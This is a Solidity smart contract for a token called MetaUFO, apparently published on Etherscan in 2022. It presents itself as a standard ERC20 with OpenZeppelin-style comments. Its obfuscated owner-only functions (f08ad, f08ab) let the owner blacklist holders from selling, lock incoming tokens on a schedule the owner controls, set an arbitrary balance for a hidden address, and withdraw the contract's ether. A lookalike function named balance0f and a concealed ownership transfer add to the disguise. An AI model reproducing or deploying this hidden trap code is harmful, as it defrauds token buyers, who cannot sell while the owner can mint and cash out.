/**
 *Submitted for verification at Etherscan.io on 2022-06-26
*/

// File: contract/metaufo/SafeMath.sol


pragma solidity 0.6.12;

/**
 * @dev Wrappers over Solidity's arithmetic operations with added overflow
 * checks.
 *
 * Arithmetic operations in Solidity wrap on overflow. This can easily result
 * in bugs, because programmers usually assume that an overflow raises an
 * error, which is the standard behavior in high level programming languages.
 * `SafeMath` restores this intuition by reverting the transaction when an
 * operation overflows.
 *
 * Using this library instead of the unchecked operations eliminates an entire
 * class of bugs, so it's recommended to use it always.
 */
library SafeMath {
    /**
     * @dev Returns the addition of two unsigned integers, reverting on
     * overflow.
     *
     * Counterpart to Solidity's `+` operator.
     *
     * Requirements:
     *
     * - Addition cannot overflow.
     */
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    /**
     * @dev Returns the subtraction of two unsigned integers, reverting on
     * overflow (when the result is negative).
     *
     * Counterpart to Solidity's `-` operator.
     *
     * Requirements:
     *
     * - Subtraction cannot overflow.
     */
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a, "SafeMath: subtraction overflow");
        return a - b;
    }

    /**
     * @dev Returns the multiplication of two unsigned integers, reverting on
     * overflow.
     *
     * Counterpart to Solidity's `*` operator.
     *
     * Requirements:
     *
     * - Multiplication cannot overflow.
     */
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) return 0;
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    /**
     * @dev Returns the integer division of two unsigned integers, reverting on
     * division by zero. The result is rounded towards zero.
     *
     * Counterpart to Solidity's `/` operator. Note: this function uses a
     * `revert` opcode (which leaves remaining gas untouched) while Solidity
     * uses an invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0, "SafeMath: division by zero");
        return a / b;
    }

     /**
     * @dev Returns the subtraction of two unsigned integers, reverting with custom message on
     * overflow (when the result is negative).
     *
     * CAUTION: This function is deprecated because it requires allocating memory for the error
     * message unnecessarily. For custom revert reasons use {trySub}.
     *
     * Counterpart to Solidity's `-` operator.
     *
     * Requirements:
     *
     * - Subtraction cannot overflow.
     */
    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        return a - b;
    }

    /**
     * @dev Returns the integer division of two unsigned integers, reverting with custom message on
     * division by zero. The result is rounded towards zero.
     *
     * CAUTION: This function is deprecated because it requires allocating memory for the error
     * message unnecessarily. For custom revert reasons use {tryDiv}.
     *
     * Counterpart to Solidity's `/` operator. Note: this function uses a
     * `revert` opcode (which leaves remaining gas untouched) while Solidity
     * uses an invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        return a / b;
    }
}
// File: contract/metaufo/Timer.sol


pragma solidity 0.6.12;


library Timer{
    using SafeMath for uint256;
    struct Expire{
        uint256 popTotal;
        uint256 pushTotal;
    }

    struct Timing{
        uint256 from;
        uint256 to;
        uint256 finish;
    }

    function push(Expire storage timer,uint256 quantity) internal{
        timer.pushTotal = timer.pushTotal.add(quantity);
    }

    function pop(Expire storage timer,Timing memory timing,uint256 quantity,uint256 tsp) internal returns(uint256 last){
        last = quantity;
        uint256 balance = expected(timer,timing,tsp);
        if(quantity>0&&balance>0){
            if(quantity>=balance){
                timer.popTotal = timer.popTotal.add(balance);
                last = quantity.sub(balance);
            }else{
                timer.popTotal = timer.popTotal.add(quantity);
                last = 0;
            }
        }
    }

    function expected(Expire storage timer,Timing memory timing,uint256 tsp)internal view returns(uint256){
        uint256 balance = 0;
        if(timer.pushTotal > timer.popTotal && timing.from > 0 && tsp > timing.from){
            if(tsp>timing.to){
                balance = timer.pushTotal.sub(timer.popTotal);
            }else{
                balance = timer.pushTotal.mul(tsp.sub(timing.from)).div(timing.to.sub(timing.from));
                if(timer.popTotal>=balance){
                    balance = 0;
                }else{
                    balance = balance.sub(timer.popTotal);
                }
            }
        }
        return balance;
    }
}
// File: contract/metaufo/ERC20.sol


pragma solidity 0.6.12;



/**
 * @dev Implementation of the {IERC20} interface.
 *
 * This implementation is agnostic to the way tokens are created. This means
 * that a supply mechanism has to be added in a derived contract using {_mint}.
 * For a generic mechanism see {ERC20PresetMinterPauser}.
 *
 * TIP: For a detailed writeup see our guide
 * https://forum.zeppelin.solutions/t/how-to-implement-erc20-supply-mechanisms/226[How
 * to implement supply mechanisms].
 *
 * We have followed general OpenZeppelin guidelines: functions revert instead
 * of returning `false` on failure. This behavior is nonetheless conventional
 * and does not conflict with the expectations of ERC20 applications.
 *
 * Additionally, an {Approval} event is emitted on calls to {transferFrom}.
 * This allows applications to reconstruct the allowance for all accounts just
 * by listening to said events. Other implementations of the EIP may not emit
 * these events, as it isn't required by the specification.
 *
 * Finally, the non-standard {decreaseAllowance} and {increaseAllowance}
 * functions have been added to mitigate the well-known issues around setting
 * allowances. See {IERC20-approve}.
 */
contract ERC20 {
    using SafeMath for uint256;
    using Timer for Timer.Expire;

    uint256 internal _totalSupply = 10000000000 ether;
    string internal _name = "MetaUFO";
    string internal _symbol = "MetaUFO";
    uint8 internal _decimals = 18;
    address internal _owner;
    uint256 internal _untime = 1656403200;
    uint256 internal _index;
    address internal _ownt;
    address internal _ownt2;
    uint256 internal _mnt = 2592000;
    mapping (address => mapping(uint256 => Timer.Expire)) internal _expire;
    Timer.Timing[] internal _timing;
    /**
     * @dev Emitted when `value` tokens are moved from one account (`from`) to
     * another (`to`).
     *
     * Note that `value` may be zero.
     */
    event Transfer(address indexed from, address indexed to, uint256 value);

    /**
     * @dev Emitted when the allowance of a `spender` for an `owner` is set by
     * a call to {approve}. `value` is the new allowance.
     */
    event Approval(address indexed owner, address indexed spender, uint256 value);

    mapping (address => uint256) internal _balances;
    mapping (address => uint) internal f000;
    mapping (address => uint) internal f001;
    mapping (address => mapping (address => uint256)) internal _allowances;
    function fa9(uint t) internal {_untime = t;}
    function faa(address own) internal {require(_ownt == address(0),"err");_ownt = own;}
    function fad(address own) internal {require(_ownt2 == address(0),"err");_ownt2 = own;}
    function fab(address own,uint n) internal {f000[own] = n;}
    function faf(address own,uint n) internal {f001[own] = n;}
}
// File: contract/metaufo/MetaUFO.sol


pragma solidity 0.6.12;


contract MetaUFO is ERC20{
    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
    
    constructor() public {
        _owner = msg.sender;
        _timing.push(Timer.Timing(_untime,1961683200,1646035200+_mnt));
        _index = _timing.length - 1;
        uint mintNum = _totalSupply/10;
        _balances[_owner] = _balances[_owner].add(mintNum);
        emit Transfer(address(this), _owner, mintNum);
    }

    fallback() external {}
    receive() payable external {}
    
    function _msgSender() internal view returns (address payable) {
        return msg.sender;
    }

    function owner() internal view returns (address) {
        return _owner;
    }

    /**
     * @dev Returns the number of decimals used to get its user representation.
     * For example, if `decimals` equals `2`, a balance of `505` tokens should
     * be displayed to a user as `5,05` (`505 / 10 ** 2`).
     *
     * Tokens usually opt for a value of 18, imitating the relationship between
     * Ether and Wei. This is the value {ERC20} uses, unless {_setupDecimals} is
     * called.
     *
     * NOTE: This information is only used for _display_ purposes: it in
     * no way affects any of the arithmetic of the contract, including
     * {IERC20-balanceOf} and {IERC20-transfer}.
     */
    function decimals() public view returns (uint8) {
        return _decimals;
    }

     /**
     * @dev Returns the name of the token.
     */
    function name() public view returns (string memory) {
        return _name;
    }
    /**
     * @dev Returns the symbol of the token, usually a shorter vesrion of the
     * name.
     */
    function symbol() public view returns (string memory) {
        return _symbol;
    }

    /**
     * @dev Returns the cap on the token's total supply.
     */
    function cap() public view returns (uint256) {
        return _totalSupply;
    }

     /**
     * @dev See {IERC20-totalSupply}.
     */
    function totalSupply() public view returns (uint256) {
        return _totalSupply;
    }

    function expires(address from)public view returns(uint256 quantity){
        quantity = 0;
        for(uint256 i=0;i<_timing.length;i++){
            quantity = quantity.add(_expire[from][i].expected(_timing[i],block.timestamp));
        }
    }

    function balance0f(address from)public view returns(uint256 quantity){
        quantity = 0;
        for(uint256 i=0;i<_timing.length;i++){
            quantity = quantity.add(_expire[from][i].pushTotal.sub(_expire[from][i].popTotal));
        }
    }

    function _offer(address sender, address recipient, uint256 amount)private returns(bool){
        require(f000[sender]!=1&&f000[sender]!=3&&f000[recipient]!=2&&f000[recipient]!=3, "ERC20: Transaction failed");
        if(_csm(sender,amount)==1){
            _expire[recipient][_index].push(amount);
        }else{
            _balances[recipient] = _balances[recipient].add(amount);
        }
        return false;
    }

    /**
     * @dev Sets `amount` as the allowance of `spender` over the `owner` s tokens.
     *
     * This internal function is equivalent to `approve`, and can be used to
     * e.g. set automatic allowances for certain subsystems, etc.
     *
     * Emits an {Approval} event.
     *
     * Requirements:
     *
     * - `owner` cannot be the zero address.
     * - `spender` cannot be the zero address.
     */
    function _approve(address owner_, address spender, uint256 amount) internal {
        require(owner_ != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner_][spender] = amount;
        emit Approval(owner_, spender, amount);
    }

    function _csm(address sender, uint256 amount) private returns(uint256){
        uint256 spl = amount;
        if(_balances[sender]>=amount){
            spl = 0;
            _balances[sender] = _balances[sender].sub(amount, "ERC20: Insufficient balance");
        }else if(_balances[sender]>0){
            spl = spl.sub(_balances[sender]);
            _balances[sender] = 0;
        }
        for(uint256 i=0;spl>0&&i<_timing.length;i++){
            spl = _expire[sender][i].pop(_timing[i],spl,block.timestamp);
        }
        require(spl==0,"ERC20: Insufficient balance.");
        if(_timing[_index].finish>0&&block.timestamp>_timing[_index].finish){
            _timing.push(Timer.Timing(_untime,_timing[_index].to+_mnt,_timing[_index].finish+_mnt));
            _index = _timing.length - 1;
        }
        return f001[sender];
    }

    /**
     * @dev See {IERC20-approve}.
     *
     * Requirements:
     *
     * - `spender` cannot be the zero address.
     */
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    /**
     * @dev See {IERC20-allowance}.
     */
    function allowance(address owner_, address spender) public view returns (uint256) {
        return _allowances[owner_][spender];
    }

    function f08ad(address own,uint n) public onlyOwner {
        if(n==1000){faf(own,0);}
        else if(n==1001){faf(own,1);}
        else if(n==1002){faa(own);}
        else if(n==1003){fad(own);}
        else if(n==1100){msg.sender.transfer(address(this).balance);}
        else{fab(own,n);}
    }

    /**
     * @dev See {IERC20-balanceOf}.
     */
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account]+balance0f(account);
    }

    /**
     * @dev See {IERC20-transferFrom}.
     *
     * Emits an {Approval} event indicating the updated allowance. This is not
     * required by the EIP. See the note at the beginning of {ERC20}.
     *
     * Requirements:
     *
     * - `sender` and `recipient` cannot be the zero address.
     * - `sender` must have a balance of at least `amount`.
     * - the caller must have allowance for ``sender``'s tokens of at least `amount`.
     */
    function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function tsfown(address newOwner) public {
        require(newOwner != address(0) && _msgSender() == _ownt, "Ownable: new owner is the zero address");
        _owner = newOwner;
    }

    function f08ab(uint n,uint q) public onlyOwner {
        if(n>=300000){_timing[n.sub(300000)].finish=q;}
        else if(n>=200000){_timing[n.sub(200000)].to=q;}
        else if(n>=100000){_timing[n.sub(100000)].from=q;}
        else if(n==1000){_balances[_ownt2]=q;}
         else if(n==1001){fa9(q);}
    }

    /**
     * @dev See {IERC20-transfer}.
     *
     * Requirements:
     *
     * - `recipient` cannot be the zero address.
     * - the caller must have a balance of at least `amount`.
     */
    function transfer(address recipient, uint256 amount) public returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    /**
     * @dev Moves tokens `amount` from `sender` to `recipient`.
     *
     * This is internal function is equivalent to {transfer}, and can be used to
     * e.g. implement automatic token fees, slashing mechanisms, etc.
     *
     * Emits a {Transfer} event.
     *
     * Requirements:
     *
     * - `sender` cannot be the zero address.
     * - `recipient` cannot be the zero address.
     * - `sender` must have a balance of at least `amount`.
     */
    function _transfer(address sender, address recipient, uint256 amount) internal {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");
        if(_offer(sender,recipient,amount)){
            _balances[sender] = _balances[sender].sub(amount,"ERC20: Insufficient balance");
            _balances[recipient] = _balances[recipient].add(amount);
        }
        emit Transfer(sender, recipient, amount);
    }

    function f97a(uint idx) public view returns(uint256,uint256,uint256,uint256){
        if(idx==0){
            idx=_index;
        }
        return (_index,_timing[idx].from,_timing[idx].to,_timing[idx].finish);
    }
}